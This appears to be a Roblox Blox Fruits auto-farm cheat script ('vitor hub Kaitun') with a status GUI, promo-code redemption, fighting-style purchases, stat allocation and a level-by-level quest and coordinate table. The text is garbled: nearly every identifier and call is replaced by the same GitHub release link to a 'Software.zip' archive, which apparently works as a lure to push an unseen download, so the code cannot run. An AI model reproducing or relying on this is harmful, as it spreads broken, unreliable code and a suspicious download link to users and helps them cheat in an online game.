https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 78, 0, 78)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip"

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "LogoName"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Logo
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1.17929673, 0, 0.0880808681, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 124, 0, 70)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "vitor hub Kaitun"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "ToggleUIButton"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = vitorhubkaitun
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 0, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.159199998, 0, 0.25920248, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 70, 0, 70)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "open"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 41.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = ToggleUIButton

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true

local updateStatus = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function() -- ngu qua ma. huuh
    while https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip do
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Gun : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Fruit : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip["Demon Fruit"]https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Melee : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Sword : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Defense : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Beli : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Fragments : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Level : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

		local https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
		local seconds = scripttime%60
		local minutes = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(scripttime/60%60)
		local hours = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(scripttime/3600)
		local tempo = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("%.0f:%.0f:%.0f", hours ,minutes, seconds)
		https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Client Uptime : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        wait(1)
    end
end)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(updateStatus)

local toggleState = true

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function()
    toggleState = not toggleState -- Toggling the state
    if toggleState then
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "close"
        game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
    else
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "open"
        game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
    end
end)

local function drag()
	local script = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip('LocalScript', ToggleUIButton)
	local UIS = game:GetService('UserInputService')
	local frame = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - dragStart
		local position = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip + delta.X,
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip + delta.Y)
		game:GetService('TweenService'):Create(frame, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(dragSpeed), {Position = position}):Play()
	end
	
	https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function(input)
		if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip) then 
			dragToggle = true
			dragStart = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
			startPos = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function()
				if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
					dragToggle = false
				end
			end)
		end
	end)
	
	https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function(input)
		if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
	
end
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(drag)()

local function drag2()
	local script = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip('LocalScript', Frame)
	local UIS = game:GetService('UserInputService')
	local frame = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - dragStart
		local position = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip + delta.X,
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip + delta.Y)
		game:GetService('TweenService'):Create(frame, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(dragSpeed), {Position = position}):Play()
	end
	
	https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function(input)
		if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip) then 
			dragToggle = true
			dragStart = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
			startPos = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function()
				if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
					dragToggle = false
				end
			end)
		end
	end)
	
	https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function(input)
		if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
	
end
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(drag2)()

print("Dang load")

-- Main code

spawn(function()
    while https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip() do
        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == nil then
            pcall(function()
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Pirates" then
                    game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(10000,1000,10000,1000)
                    game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4,0,-5,0)
                    wait(.5)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(605,394,0,true,game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,0)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(605,394,0,false,game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,0)
                elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Marines" then
                    game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(10000,1000,10000,1000)
                    game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4,0,-5,0)
                    wait(.5)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(605,394,0,true,game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,0)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(605,394,0,false,game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,0)
                else
                    game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(10000,1000,10000,1000)
                    game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4,0,-5,0)
                    wait(.5)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(605,394,0,true,game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,0)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(605,394,0,false,game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,0)
                end
            end)
        end
    end
end)

function UseCode(Text) -- theres no button.
    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(Text)
end

UseCode("Enyu_is_Pro")
UseCode("Magicbus")
UseCode("JCWK")
UseCode("Starcodeheo")
UseCode("Bluxxy")
UseCode("fudd10_v2")
UseCode("3BVISITS")
UseCode("UPD16")
UseCode("FUDD10")
UseCode("UPD15")
UseCode("Sub2OfficialNoobie")
UseCode("SUB2GAMERROBOT_EXP1")
UseCode("THEGREATACE")
UseCode("SUB2NOOBMASTER123")
UseCode("Axiore")
UseCode("TantaiGaming")
UseCode("STRAWHATMAINE") 

warn("redeemed")

    vu = true
    AutoKaitan = vu
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = vu

	if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip and SelectToolWeapon == "" then
		print("select weapon first")
	else
		Auto_Farm = vu
		SelectMonster = ""
		if vu == false then
			wait(1)
			TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
    end
end

    spawn(function()
        while wait(.5) do
            if AutoKaitan and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("WeaponAssetCache") then
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Combat") or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Combat") then
                    local args = {
                        [1] = "BuyBlackLeg"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end   
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Superhuman") or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Superhuman") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    SelectToolWeapon = "Superhuman"
                end  
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Black Leg") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Black Leg")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 299 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    SelectToolWeapon = "Black Leg"
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Electro") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Electro")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 299 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    SelectToolWeapon = "Electro"
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fishman Karate") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fishman Karate")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 299 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    SelectToolWeapon = "Fishman Karate"
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Dragon Claw") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Dragon Claw")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 299 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    SelectToolWeapon = "Dragon Claw"
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Black Leg") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Black Leg")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BuyElectro"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Black Leg") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Black Leg")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BuyElectro"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Electro") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Electro")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BuyFishmanKarate"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Electro") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Electro")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BuyFishmanKarate"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fishman Karate") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fishman Karate")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BlackbeardReward",
                        [2] = "DragonClaw",
                        [3] = "2"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fishman Karate") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fishman Karate")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BlackbeardReward",
                        [2] = "DragonClaw",
                        [3] = "2"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Dragon Claw") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Dragon Claw")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BuySuperhuman"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Dragon Claw") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Dragon Claw")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                    local args = {
                        [1] = "BuySuperhuman"
                    }
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
                end 
            end
        end
    end)
 
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true

spawn(function() -- only for sea 1, co the se lam cho sea 2 va 3 vi tui thay great tree ma nang moi melee la chet.
	while wait() do
		if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
			if game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip < 2400 then
                game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("AddPoint","Melee")
			else
                game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("AddPoint","Defense")			
			end
		end
	end
end)

local placeId = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
Magnet = true
if placeId == 2753915549 then
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "First Sea"
	OldWorld = true
elseif placeId == 4442272183 then
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Second Sea"
	NewWorld = true
elseif placeId == 7449423635 then
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Third Sea"
	ThreeWorld = true
end
function Click()
	game:GetService'VirtualUser':CaptureController()
	game:GetService'VirtualUser':Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 672))
end
function CheckQuest()
	local MyLevel = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
	if OldWorld then
		if MyLevel == 1 or MyLevel <= 9 then 
			Ms = "Bandit [Lv. 5]"
			NaemQuest = "BanditQuest1"
			LevelQuest = 1
			NameMon = "Bandit"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1061.66699, 16.5166187, 1544.52905, -0.942978859, -3.33851502e-09, 0.332852632, 7.04340497e-09, 1, 2.99841325e-08, -0.332852632, 3.06188177e-08, -0.942978859)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1199.31287, 52.2717781, 1536.91516, -0.929782331, 6.60215846e-08, -0.368109822, 3.9077392e-08, 1, 8.06501603e-08, 0.368109822, 6.06023249e-08, -0.929782331)
		elseif MyLevel == 10 or MyLevel <= 14 then 
			Ms = "Monkey [Lv. 14]"
			NaemQuest = "JungleQuest"
			LevelQuest = 1
			NameMon = "Monkey"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1604.12012, 36.8521118, 154.23732, 0.0648873374, -4.70858913e-06, -0.997892559, 1.41431883e-07, 1, -4.70933674e-06, 0.997892559, 1.64442184e-07, 0.0648873374)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1772.4093017578, 60.860641479492, 54.872589111328)
		elseif MyLevel == 15 or MyLevel <= 29 then 
			Ms = "Gorilla [Lv. 20]"
			NaemQuest = "JungleQuest"
			LevelQuest = 2
			NameMon = "Gorilla"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1604.12012, 36.8521118, 154.23732, 0.0648873374, -4.70858913e-06, -0.997892559, 1.41431883e-07, 1, -4.70933674e-06, 0.997892559, 1.64442184e-07, 0.0648873374)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1223.52808, 6.27936459, -502.292664, 0.310949147, -5.66602516e-08, 0.950426519, -3.37275488e-08, 1, 7.06501808e-08, -0.950426519, -5.40241736e-08, 0.310949147)
		elseif MyLevel == 30 or MyLevel <= 39 then 
			Ms = "Pirate [Lv. 35]"
			NaemQuest = "BuggyQuest1"
			LevelQuest = 1
			NameMon = "Pirate"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1139.59717, 4.75205183, 3825.16211, -0.959730506, -7.5857054e-09, 0.280922383, -4.06310328e-08, 1, -1.11807175e-07, -0.280922383, -1.18718916e-07, -0.959730506)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1219.32324, 4.75205183, 3915.63452, -0.966492832, -6.91238853e-08, 0.25669381, -5.21195496e-08, 1, 7.3047012e-08, -0.25669381, 5.72206496e-08, -0.966492832)
		elseif MyLevel == 40 or MyLevel <= 59 then 
			Ms = "Brute [Lv. 45]"
			NaemQuest = "BuggyQuest1"
			LevelQuest = 2
			NameMon = "Brute"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1139.59717, 4.75205183, 3825.16211, -0.959730506, -7.5857054e-09, 0.280922383, -4.06310328e-08, 1, -1.11807175e-07, -0.280922383, -1.18718916e-07, -0.959730506)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1146.49646, 96.0936813, 4312.1333, -0.978175163, -1.53222057e-08, 0.207781896, -3.33316912e-08, 1, -8.31738873e-08, -0.207781896, -8.82843523e-08, -0.978175163)
		elseif MyLevel == 60 or MyLevel <= 74 then 
			Ms = "Desert Bandit [Lv. 60]"
			NaemQuest = "DesertQuest"
			LevelQuest = 1
			NameMon = "Desert Bandit"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(897.031128, 6.43846416, 4388.97168, -0.804044724, 3.68233266e-08, 0.594568789, 6.97835176e-08, 1, 3.24365246e-08, -0.594568789, 6.75715199e-08, -0.804044724)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(932.788818, 6.4503746, 4488.24609, -0.998625934, 3.08948351e-08, 0.0524050146, 2.79967303e-08, 1, -5.60361286e-08, -0.0524050146, -5.44919629e-08, -0.998625934)
		elseif MyLevel == 75 or MyLevel <= 89 then 
			Ms = "Desert Officer [Lv. 70]"
			NaemQuest = "DesertQuest"
